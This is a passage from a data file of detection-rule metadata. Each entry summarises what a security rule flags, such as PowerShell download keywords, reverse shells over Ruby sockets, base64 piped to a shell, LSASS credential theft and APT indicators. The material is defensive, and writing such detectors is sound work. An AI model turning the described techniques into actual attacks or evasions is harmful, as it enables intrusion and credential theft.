    checks for command lines containing download-related keywords like `'.DownloadString('`,
    `'.DownloadFile('`, `'Invoke-WebRequest '`, `'iwr '`, or `'wget '`. The rule also
    flags command lines that include URLs from known file-sharing domains such as
    anonfiles.com, cdn.discordapp.com, dropboxusercontent.com, pastebin.com, mega.nz,
    and others. This monitoring helps identify potentially malicious activities involving
    the use of PowerShell for downloading files from these sites.
  Updated-Date: '2024_09_04'
b6ea3cc7-542f-43ef-bbe4-980fbed444c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc96839c33c314045db142860fabb5ec
  Ruleset: core
  Summary: This rule detects remote RPC calls that potentially exploit the remote
    encryption service through Microsoft Server Service (MS-SRVS). Observable indicators
    include specific event logs generated by RPC Firewall, specifically where the
    EventID is 3 and the InterfaceUuid matches `4b324fc8-1670-01d3-1278-5a47bf6ee188`.
    This activity could signify attempts at lateral movement within a network. However,
    it's important to consider false positives, which may stem from legitimate remote
    share creation activities.
  Updated-Date: '2024_09_03'
b6f91281-20aa-446a-b986-38a92813a18f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7754679b59b10cc71d86bac9b01ccae2
  Ruleset: core
  Summary: This rule detects an attacker creating deceptive folder structures resembling
    legitimate Windows system folders, such as "Windows" or "Program Files," but with
    an extra space. This tactic aims to exploit the DLL load search order and execute
    a "DLL Search Order Hijacking" attack, where a malicious DLL is loaded instead
    of a legitimate one. The focus is on monitoring file events in Windows, specifically
    targeting filenames that start with paths altered by an additional space and ending
    in ".dll".
  Updated-Date: '2024_09_03'
b7155193-8a81-4d8f-805d-88de864ca50c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 736210fc93744467c943254f11ea904a
  Ruleset: emerging-threats
  Summary: This rule detects a specific PowerShell command-line pattern associated
    with the UNC2452 threat actors, as identified in reports from Microsoft and Symantec.
    The rule specifically looks for commands employing 'Invoke-WMIMethod' to create
    a process using 'rundll32' in the Windows directory or using 'wmic' to execute
    a similar process creation method. The detection focuses on these patterns in
    process creation logs on Windows systems to identify potentially malicious activity
    related to UNC2452's techniques.
  Updated-Date: '2024_09_03'
b7216a7d-687e-4c8d-82b1-3080b2ad961f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8877aa8cfd43939fdde122499f93117c
  Ruleset: sigmahq
  Summary: This rule detects modifications to Group Policy settings via ScriptBlockLogging
    that may indicate malicious behavior. It specifically looks for changes to keys
    related to GroupPolicyRefreshTime, GroupPolicyRefreshTimeOffset, EnableSmartScreen,
    and ShellSmartScreenLevel within the registry path \SOFTWARE\Policies\Microsoft\Windows\System.
    The detection relies on Script Block Logging being enabled and aims to identify
    potentially unauthorized actions that could be part of a larger attack strategy,
    such as defense evasion or privilege escalation.
  Updated-Date: '2024_09_04'
b730a276-6b63-41b8-bcf8-55930c8fc6ee:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8c1f87f6f8fcacc493835f1e93d43cf0
  Ruleset: core
  Summary: This rule detects the execution of "csc.exe" (C# Compiler) with a potentially
    suspicious parent process, which may indicate a payload delivery mechanism. It
    identifies specific parent processes that are uncommon for "csc.exe" to be spawned
    from, such as "cscript.exe," "excel.exe," "mshta.exe," "onenote.exe," "outlook.exe,"
    "powerpnt.exe," "winword.exe," and "wscript.exe." Additionally, it checks for
    parent processes like "powershell.exe" and "pwsh.exe" when certain suspicious
    command-line arguments are present, related to Base64 encoding. The rule also
    examines parent processes running from unusual locations such as "ProgramData,"
    "%LocalAppData%," in directories like "PerfLogs," "Users\Public," "Windows\Temp,"
    "Temporary Internet," and specific user directories like "Favorites," "Contacts,"
    and "Pictures." Filters exclude benign sources such as "C:\Program Files\," "sdiagnhost.exe,"
    "w3wp.exe," "choco.exe," Microsoft Defender ATP, and certain Ansible scripts to
    reduce false positives.
  Updated-Date: '2024_09_03'
b743623c-2776-40e0-87b1-682b975d0ca5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4bf62639459ddfcfea6daa6460d77b1d
  Ruleset: sigmahq
  Summary: This rule detects attempts to create and add an account to the admin group
    on macOS systems utilizing the "dscl" command line tool. The detection focuses
    on specific command line arguments used in conjunction with dscl to modify group
    memberships, indicating possible privilege escalation activities. This can be
    a critical early indicator of unauthorized changes intended to elevate user privileges
    on a system.
  Updated-Date: '2024_09_04'
b7916c2a-fa2f-4795-9477-32b731f70f11:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b4048050318bf18f0706f4a47d47e865
  Ruleset: core
  Summary: This rule detects a possible persistence mechanism that targets the Windows
    Explorer Run key in the registry, specifically looking for entries pointing to
    suspicious folders. The suspicious folders may include paths such as \$Recycle.bin,
    ProgramData, Temp, Default user directories, Public user directories, and AppData
    Temp folders. This technique is often associated with malware like Upatre, which
    is known for evolving with new anti-analysis techniques to maintain persistence
    on infected systems.
  Updated-Date: '2024_09_03'
b7966f4a-b333-455b-8370-8ca53c229762:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0691dbd84b1086bc91998c9fb8e8589c
  Ruleset: sigmahq
  Summary: This rule detects the dropping of DLL files in the system32 directory that
    are likely used to retrieve user credentials from the Local Security Authority
    Subsystem Service (LSASS). These activities involve the use of command-line operations
    referring to the registry path 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' and
    the 'scecli' DLL, indicative of attempts to add a credential retrieval function,
    potentially using password filter DLLs as described in related security literature.
  Updated-Date: '2024_09_04'
b7967e22-3d7e-409b-9ed5-cdae3f9243a1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3be337feaca53e3874ea34db506034f1
  Ruleset: emerging-threats
  Summary: This rule detects process access to verclsid.exe indicating possible shellcode
    injection from a Microsoft Office application or VBA macro. The detection criteria
    include the presence of specific call traces and process access patterns, suggesting
    malicious activity related to defense evasion and privilege escalation tactics
    commonly used in attacks.
  Updated-Date: '2024_09_03'
b7a3c9a3-09ea-4934-8864-6a32cacd98d9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e080f6f07d50c0bbf45f586f08ff2f8e
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell scripts that utilize the "Compress-Archive"
    cmdlet to compress folders and files, saving the output in potentially suspicious
    locations such as the system's TEMP directory. It aims to identify activities
    where an adversary might be preparing data for exfiltration by compressing collected
    sensitive documents to enhance portability and minimize data transfer size.
  Updated-Date: '2024_09_04'
b7b19cb6-9b32-4fc4-a108-73f19acfe262:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91fabd67330688e154ff8701d6243d4c
  Ruleset: sigmahq
  Summary: This rule detects the execution of VBoxDrvInst.exe with parameters used
    for processing INF files. Such execution allows creating registry values and installing
    drivers, which can be exploited to gain persistence by modifying registry keys
    such as Run or RunOnce.
  Updated-Date: '2024_09_04'
b7bc7038-638b-4ffd-880c-292c692209ef:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c678a3b3626f5813784947e751d7fd85
  Ruleset: core
  Summary: This rule detects the creation of an Exchange Certificate Signing Request
    (CSR) written to an unusual directory, or with an .aspx file name suffix, on Microsoft
    Exchange servers. This activity can be indicative of an attempt to deploy a webshell
    for malicious purposes. The rule is designed to monitor specific PowerShell command
    patterns related to the generation and export of Exchange certificates, particularly
    when these certificates are saved in directories commonly associated with web
    content or webshells. Malicious actors might leverage this technique to gain persistent
    access to the system.
  Updated-Date: '2024_09_03'
b7e2a8d4-74bb-4b78-adc9-3f92af2d4829:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 894edc9ec639be361cc4820f4c743a02
  Ruleset: core
  Summary: This rule detects when an adversary uses the reg.exe utility to add or
    modify keys or subkeys in suspicious registry paths on a Windows system. It monitors
    process creation events specifically for reg.exe and scrutinizes the command line
    for indicators of changes to critical registry locations such as those under AppData,
    Windows policies, and Windows Defender directories. These actions can be indicative
    of defense evasion or other malicious activities aimed at compromising system
    security settings.
  Updated-Date: '2024_09_03'
b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d6d7386f06722fa244d9562920501dc1
  Ruleset: core
  Summary: This rule detects the execution of the PSAttack PowerShell hack tool by
    identifying script blocks containing the text "PS ATTACK!!!". PSAttack is a post-exploitation
    tool designed for performing offensive security operations. The detection relies
    on the presence of specific text within PowerShell script blocks, highlighting
    potentially malicious activity.
  Updated-Date: '2024_09_03'
b8225208-81d0-4715-a822-12bcdd583e0f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d568b1fd8a0f82c781b2ac3232043a33
  Ruleset: emerging-threats
  Summary: This rule detects potential command and control (C2) communication activity
    associated with the Peach Sandstorm Advanced Persistent Threat (APT). It specifically
    identifies HTTP GET requests where the URI ends with either '/api/Core/Command/Init'
    or '/api/Core/Command/Restart', indicating possible malicious commands being sent
    to or from the infected systems.
  Updated-Date: '2024_09_03'
b831353c-1971-477b-abb6-2828edc3bca1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d8d8dcec55a01e1e7c27f49db965efc
  Ruleset: sigmahq
  Summary: This rule detects when secrets in Azure Keyvault are modified or deleted.
    It monitors activity logs for specific operations, including writing, deleting,
    backing up, purging, updating, recovering, restoring, and setting secrets. Such
    actions may indicate credential access or impact on the system. While these changes
    can be legitimate, particularly by system administrators, any modifications by
    unfamiliar users warrant further investigation.
  Updated-Date: '2024_09_04'
b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e6ef9714e494ad31e0382bd1fc56d86
  Ruleset: emerging-threats
  Summary: This rule detects potential credential theft activity associated with Russian
    Advanced Persistent Threat (APT) groups as described in Crowdstrike's Global Threat
    Report 2019. It identifies specific command line activity, including the use of
    "xcopy" with parameters typical of copying directories from network paths and
    the use of "adexplorer" to create and save snapshots on a local machine, which
    may indicate malicious efforts to access or exfiltrate sensitive credential information.
  Updated-Date: '2024_09_03'
b85e5894-9b19-4d86-8c87-a2f3b81f0521:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ee9e1f41e9693c29d4d06868320a0d71
  Ruleset: sigmahq
  Summary: This rule detects new Background Intelligent Transfer Service (BITS) transfer
    jobs that are saving local files with potentially suspicious extensions such as
    `.bat`, `.dll`, `.exe`, `.hta`, `.ps1`, `.psd1`, `.sh`, `.vbe`, and `.vbs`. It
    identifies events with EventID 16403 and ensures that common legitimate update
    processes are filtered out, reducing false positives from applications such as
    Chrome or Dropbox. This helps in identifying potential defense evasion and persistence
    activities on Windows systems.
  Updated-Date: '2024_09_04'
b86852fb-4c77-48f9-8519-eb1b2c308b59:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f481e1b784187f4d487eaace61e57a5
  Ruleset: sigmahq
  Summary: This rule detects the setting of the REGISTERAPPRESTART compatibility layer
    on an application. The "RegisterApplicationRestart" API allows an application
    to register for restart, which can be potentially abused as a persistence mechanism.
  Updated-Date: '2024_09_04'
b86d356d-6093-443d-971c-9b07db583c68:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 688f1442f2259f55b9dad965d966f0d8
  Ruleset: sigmahq
  Summary: This rule detects the initiation of a curl process on a Linux system wherein
    specific user agent options have been set. It targets instances where the curl
    command includes the '-A' or '--user-agent' options, which may indicate an attempt
    to disguise automated HTTP requests. The activity may be associated with command-and-control
    communication methods and could be flagged in legitimate scenarios, such as administrative
    tasks or developer scripts.
  Updated-Date: '2024_09_04'
b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 493834343d97ee503c53799609751f6a
  Ruleset: core
  Summary: This rule detects when a file is downloaded from an IP-based URL using
    the CertOC.exe program. CertOC.exe is a utility found in the Windows operating
    system, typically used for certificate operations. The detection focuses on specific
    indications such as processes involving certoc.exe, command lines with an IP-based
    URL pattern, and the presence of the '-GetCACAPS' argument. The rule aims to identify
    potential command-and-control or malicious execution activities often related
    to attack technique T1105, which involves the transfer of files through different
    protocols.
  Updated-Date: '2024_09_03'
b888e3f2-224d-4435-b00b-9dd66e9ea1f1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 342e043ab95ea2877a840d46735c3cfb
  Ruleset: sigmahq
  Summary: This rule detects the use of the Windows Input Method Editor (IME) keyboard
    layout feature, which can be exploited by attackers to load a DLL into a process
    by sending the WM_INPUTLANGCHANGEREQUEST message. This requires the attacker to
    first register the DLL under a specific registry key meant for implementing the
    keyboard layout. The registry key should contain a value named "Ime File" with
    the DLL path. This feature is particularly associated with languages such as Chinese,
    Japanese, and Korean, which have more characters than a standard keyboard can
    represent.
  Updated-Date: '2024_09_04'
b8b1b304-a60f-4999-9a6e-c547bde03ffd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c51de973b1d9e2bb5d790c1ed82825d6
  Ruleset: sigmahq
  Summary: This rule detects the execution of DeviceCredentialDeployment.exe, a utility
    associated with defense evasion tactics. This process may be leveraged to hide
    other processes from view, potentially indicating malicious activity.
  Updated-Date: '2024_09_04'
b8bdac18-c06e-4016-ac30-221553e74f59:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2051dae600cb0c15fe4229a6299e14f7
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Ruby programming language with the
    "-e" flag in combination with calls to "socket" related functions such as 'rsocket'
    and 'TCPSocket'. These indicators suggest a potential attempt to set up a reverse
    shell, which is a common technique used in unauthorized access and control scenarios.
    The detection is focused on process creation logs in Linux environments and may
    involve various shell processes like 'ash', 'bash', 'sh', and others.
  Updated-Date: '2024_09_04'
b8fd0e93-ff58-4cbd-8f48-1c114e342e62:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aca77083e7104cb2ccc1652528221bb4
  Ruleset: core
  Summary: This rule detects Windows executables that write files with certain suspicious
    extensions, which is indicative of potential malware activity or unauthorized
    behavior. The rule monitors processes such as `csrss.exe`, `lsass.exe`, `RuntimeBroker.exe`,
    and others when they create files with extensions like `.bat`, `.dll`, `.exe`,
    `.hta`, `.iso`, `.ps1`, `.txt`, `.vbe`, and `.vbs`. It also covers processes like
    `dllhost.exe`, `rundll32.exe`, and `svchost.exe` specifically for writing files
    with extensions such as `.bat`, `.hta`, `.iso`, `.ps1`, `.vbe`, and `.vbs`. Filters
    are applied to exclude benign activities from `dllhost.exe` and `svchost.exe`
    associated with specific paths related to AppLocker policy tests and Group Policy
    Object (GPO) machine scripts, focusing the detection on more likely malicious
    events.
  Updated-Date: '2024_09_03'
b91e8d5e-0033-44fe-973f-b730316f23a1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a275474a531f2d473b1aa0ad7308314
  Ruleset: sigmahq
  Summary: This rule detects when a repository in Bitbucket is exempted from the secret
    scanning feature, which could indicate an attempt to evade security measures.
    It monitors audit log events categorized under "Repositories" with the action
    "Secret scanning exempt repository added."
  Updated-Date: '2024_09_04'
b923f7d6-ac89-4a50-a71a-89fb846b4aa8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d439981be94adfde74729f21955ce1b
  Ruleset: core
  Summary: This rule detects patterns associated with Empire agents by identifying
    specific user agents and URI paths commonly used in their communication. The Empire
    framework facilitates post-exploitation tasks, including establishing command-and-control
    (C2) channels. The detection criteria focus on HTTP POST requests containing a
    user agent string "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like
    Gecko" combined with specified URI paths such as '/admin/get.php', '/news.php',
    or '/login/process.php'. These indicators help pinpoint the use of Empire malware
    involved in command-and-control activities.
  Updated-Date: '2024_09_03'
b92d1d19-f5c9-4ed6-bbd5-7476709dc389:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5a67cb2aa3ce2ef82a35a6174cd2dfe1
  Ruleset: emerging-threats
  Summary: This rule detects the creation of specific files within the ProgramData
    directory on Windows systems, which is an indicator of potential malicious activity
    by the Forest Blizzard Advanced Persistent Threat (APT) group. Forest Blizzard
    is known for creating files and directories in locations such as `C:\ProgramData\Microsoft\v`,
    `C:\ProgramData\Adobe\v`, among others. The detection focuses on files with certain
    patterns, like those ending in `.save`, `\doit.bat`, or containing `\wayzgoose`,
    as well as specific .inf and .dll files. This behavior is associated with Forest
    Blizzard's exploitation of a specific vulnerability to obtain credentials, as
    reported by Microsoft.
  Updated-Date: '2024_09_03'
b94bf91e-c2bf-4047-9c43-c6810f43baad:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5ba0590fabca7ed42b76467dfa4d2bc9
  Ruleset: sigmahq
  Summary: This rule detects when an Elastic Container Service (ECS) Task Definition
    contains a command to query the credential endpoint. Such activity could indicate
    that an adversary is attempting to establish persistence or escalate privileges
    by adding a backdoor.
  Updated-Date: '2024_09_04'
b96b2031-7c17-4473-afe7-a30ce714db29:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d73816bb0a29f1d3e86a8f2a3cfc070
  Ruleset: sigmahq
  Summary: This rule detects the execution of the FSharp interpreters "FsiAnyCpu.exe"
    and "Fsi.exe". These interpreters can be exploited to bypass application whitelisting
    (AWL) and execute F# code through scripts or inline commands.
  Updated-Date: '2024_09_04'
b9888738-29ed-4c54-96a4-f38c57b84bb3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b0d8fe7e6ca54318c4ee4be6017e9a2
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of the Wazuh Remote Code Execution (RCE)
    vulnerability, identified as CVE-2021-26814. The rule specifically looks for suspicious
    URI queries within webserver logs that indicate an attempt to exploit this vulnerability
    by accessing unauthorized file paths.
  Updated-Date: '2024_09_03'
b98968aa-dbc0-4a9c-ac35-108363cbf8d5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27047b2e4ed3de869d76e701532ce233
  Ruleset: core
  Summary: This rule detects potential malicious modification of run keys specifically
    targeting the registry path 'Software\Microsoft\Windows\CurrentVersion\Run\Backup
    Mgr'. It is used to identify suspicious activity that might be associated with
    the winekey or team9 backdoor, which are forms of malware designed for persistence
    on compromised systems. This activity is monitored through registry event logs
    on Windows systems, focusing on changes that could indicate an unauthorized attempt
    to maintain access on the machine.
  Updated-Date: '2024_09_03'
b98a10af-1e1e-44a7-bab2-4cc026917648:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 287c1e99ea0e508284b57591df4be776
  Ruleset: sigmahq
  Summary: This rule detects the installation of the PDQDeploy service on a target
    system. Specifically, when a package is deployed via PDQDeploy, a remote service
    named "PDQDeployRunner-X" is installed, where "X" is an integer starting from
    1. The detection focuses on events where the Service Control Manager logs the
    installation of a service with a name and image path that match the "PDQDeployRunner-"
    pattern. This can signal potential privilege escalation activities but may also
    result from legitimate tool usage.
  Updated-Date: '2024_09_04'
b98d0db6-511d-45de-ad02-e82a98729620:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eb773165d651f8c91366845d258058e5
  Ruleset: core
  Summary: This rule detects the execution of the "mshta.exe" utility with arguments
    that include "http," "https," or "ftp" keywords, which could indicate that an
    attacker is executing a remotely hosted malicious HTML Application (HTA) file.
    The rule specifically looks for instances where the mshta executable is launched
    through process creation events on Windows systems, aiming to identify potential
    defense evasion and execution techniques, as referenced in observed malicious
    activity.
  Updated-Date: '2024_09_03'
b99a1518-1ad5-4f65-bc95-1ffff97a8fd0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17506d9050dd1370b613a4834d279ac1
  Ruleset: core
  Summary: This rule detects the execution of Inveigh, which is a cross-platform .NET
    tool designed for machine-in-the-middle attacks on IPv4 and IPv6 networks. Specifically,
    it identifies processes where 'Inveigh.exe' or 'Inveigh.dll' are used, or where
    the command line contains parameters related to spoofing and sniffer operations,
    such as '-SpooferIP', '-ReplyToIPs', '-ReplyToDomains', '-ReplyToMACs', or '-SnifferIP'.
    Inveigh is typically utilized for credential access through techniques like password
    capturing via network traffic interception.
  Updated-Date: '2024_09_03'
b9aeac14-2ffd-4ad3-b967-1354a4e628c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 106dc17ac72a25e347c8974be0fc12c2
  Ruleset: sigmahq
  Summary: This rule detects the use of the 'Get-Clipboard' cmdlet via the command
    line interface (CLI) on Windows systems. The 'Get-Clipboard' cmdlet is used to
    retrieve the contents of the clipboard. The detection is based on identifying
    command lines that contain the term 'Get-Clipboard', which can indicate attempts
    to programmatically access clipboard data, potentially as part of a malicious
    activity like data exfiltration. The rule operates by monitoring process creation
    logs to spot such command lines.
  Updated-Date: '2024_09_04'
b9cbbc17-d00d-4e3d-a827-b06d03d2380d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78f2027fa6bad30be3a53ea155f542ed
  Ruleset: sigmahq
  Summary: This rule detects the use of the Background Intelligent Transfer Service
    (BITS) for persistence mechanisms on Windows systems by monitoring process creation
    events. BITS, typically used for background file transfers, can be leveraged by
    malicious actors to schedule commands that execute after a successful download,
    potentially creating a backdoor. This technique involves chaining a BITS job to
    download additional malicious binaries and automatically executing them once the
    download is complete. The rule identifies the execution of 'bitsadmin.exe' combined
    with specific command-line arguments that set notification command lines or add
    files from web protocols like HTTP, HTTPS, FTP, or FTPS.
  Updated-Date: '2024_09_04'
b9d9b652-d8ed-4697-89a2-a1186ee680ac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1b5ef9e0b74669eb104c34443b8d468f
  Ruleset: core
  Summary: This rule detects potential suspicious run-only executions compiled using
    OSACompile on macOS systems. OSACompile is a utility used to compile AppleScript
    files, and the detection focuses on identifying command lines that contain specific
    flags indicating run-only execution (`-x`) and direct execution of a script (`-e`).
  Updated-Date: '2024_09_03'
b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d64c8878f813894cb4f1b28bc6970d94
  Ruleset: core
  Summary: This rule detects suspicious PowerShell command line patterns that include
    encoded commands, which are often seen in malware infection chains. The detection
    criteria focus on processes where the executable is PowerShell or a related variant
    (e.g., pwsh.exe) and the command line contains specific encoded command indicators.
    The rule excludes benign processes related to Microsoft's Guest Configuration
    Worker (gc_worker.exe) to reduce false positives.
  Updated-Date: '2024_09_03'
b9e1f193-d236-4451-aaae-2f3d2102120d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5773255c18c0144d9fc71ea257eb9932
  Ruleset: sigmahq
  Summary: This rule detects when a monitor or a SPAN/RSPAN is set up or modified
    on Cisco devices by identifying specific keywords in logs related to these actions.
    This activity could indicate credential access or discovery attempts by unauthorized
    users. However, it is also possible that legitimate administrators are configuring
    or adjusting spans or using monitors for troubleshooting purposes.
  Updated-Date: '2024_09_04'
b9f0e6f5-09b4-4358-bae4-08408705bd5c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a0a08e681ad5bb5a31809a7d5f62f292
  Ruleset: core
  Summary: This rule detects the creation of local users on Windows systems using
    the net.exe or net1.exe command with the "expires:never" option, indicating that
    the user account is set to never expire. This can be a tactic used for persistence
    within a system by malicious actors or software to maintain access indefinitely.
  Updated-Date: '2024_09_03'
ba1f7802-adc7-48b4-9ecb-81e227fddfd5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1275d6621359adf7b78969e55fb8a100
  Ruleset: sigmahq
  Summary: This rule detects potential network sniffing activity through the use of
    network tools like "tshark" and "windump." Network sniffing involves monitoring
    or capturing data transmitted over a network, either wired or wireless. An adversary
    may utilize this technique by placing a network interface into promiscuous mode
    to access data passively or by using span ports to capture a more extensive amount
    of network data.
  Updated-Date: '2024_09_04'
ba3f5c1b-6272-4119-9dbd-0bc8d21c2702:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e585347e405d2e7b4d1c9d8ff61e934
  Ruleset: core
  Summary: This rule detects the use of specific Windows API (WinAPI) functions via
    the command line, typically associated with threat actors utilizing the winapiexec
    tool. Key functions monitored in this rule include "AddSecurityPackage," "AdjustTokenPrivileges,"
    "CreateRemoteThread," "GetProcAddress," "LoadLibrary," "VirtualAlloc," "WriteProcessMemory,"
    and many others. The detection focuses on identifying these function calls within
    the process creation logs on Windows systems. The rule aims to identify potentially
    malicious activities where these API functions are executed through command line
    interfaces.
  Updated-Date: '2024_09_03'
ba42babc-0666-4393-a4f7-ceaf5a69191e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6139ca036d1f3259d427a7b4ecaa2f2b
  Ruleset: sigmahq
  Summary: This rule detects potentially uncommon child processes of SndVol.exe, the
    Windows volume mixer application, by identifying process creation events where
    the parent image ends with "SndVol.exe" and ensuring that certain common child
    processes like "rundll32.exe" executing specific commands are filtered out. This
    approach helps in highlighting unusual behavior potentially indicative of malicious
    activity.
  Updated-Date: '2024_09_04'
ba4cfc11-d0fa-4d94-bf20-7c332c412e76:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7936a56c082203c129505cd32bf8bff2
  Ruleset: core
  Summary: This rule detects the execution of "odbcconf.exe" using the "REGSVR" action
    when the Dynamic Link Library (DLL) being registered does not have a ".dll" extension.
    This behavior is often associated with attempts to evade security defenses. "odbcconf.exe"
    is a legitimate administrative tool used for configuring ODBC drivers, but it
    can be exploited for malicious purposes such as registering harmful DLLs without
    the ".dll" extension to avoid detection.
  Updated-Date: '2024_09_03'
ba5268de-4dd4-4d5c-8a90-2b5e6dc1aff8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c2a124682e21e5a238e8f8e49e733bfe
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation attempt of CVE-2023-46214, a remote
    code execution vulnerability in Splunk Enterprise caused by insecure XML parsing.
    The detection focuses on identifying specific HTTP POST requests with the status
    codes 200 and 302, URL patterns indicative of file upload and search functions
    within Splunk, and particular query parameters. This rule utilizes known public
    proof of concept (PoC) code to monitor for unauthorized actions, aiming to prevent
    potential threats associated with this vulnerability.
  Updated-Date: '2024_09_03'
ba592c6d-6888-43c3-b8c6-689b8fe47337:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1efa0ceb43ec1b0d09a6219a985a0544
  Ruleset: sigmahq
  Summary: This rule detects suspicious command-line activity on Linux systems where
    base64 encoded input is being piped for execution in a shell, such as bash or
    sh. The presence of base64 encoding combined with a subsequent shell execution
    in a command line suggests potential abuse for executing malicious payloads, typically
    as a method of defense evasion or obfuscation.
  Updated-Date: '2024_09_04'
ba6b9e43-1d45-4d3c-a504-1043a64c8469:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f416abc2366141d4fe1927006fa5cc1
  Ruleset: core
  Summary: This rule detects the presence of specific driver names associated with
    the Mimikatz tool, particularly in exploits related to CVE-2021-1675 and CVE-2021-34527.
    It identifies registry modifications that include references to QMS 810 and Mimikatz
    drivers. Additionally, it searches for alternative indicators such as "legitprinter,"
    "Gentil Kiwi," "mimikatz printer," and "Kiwi Legit Printer" within the Windows
    print environment registry paths. The goal is to detect potentially malicious
    activity linked to the exploitation of certain vulnerabilities by monitoring specific
    registry changes.
  Updated-Date: '2024_09_03'
ba778144-5e3d-40cf-8af9-e28fb1df1e20:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ddfcef9a4443a7149ab5aca5e1c880e8
  Ruleset: emerging-threats
  Summary: This rule detects activity associated with the Sofacy Trojan loader, a
    tool used by the Advanced Persistent Threat group APT28. The detection focuses
    on the process creation log source within Windows systems, specifically monitoring
    for the execution of 'rundll32.exe' with command lines that reference local application
    data paths and contain certain file extensions like '.dat' and '.dll'. This rule
    aims to identify attempts to evade defenses and execute malicious code through
    specific command line patterns associated with Sofacy's typical operations.
  Updated-Date: '2024_09_03'
bac9fb54-2da7-44e9-988f-11e9a5edbc0c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3cdbd39efd522bff9da8b8d4fbd2d193
  Ruleset: sigmahq
  Summary: This rule detects potential password spraying attempts utilizing the Dsacls.exe
    utility in a Windows environment. Password spraying is an attack method where
    an attacker tries common passwords across many accounts in order to avoid account
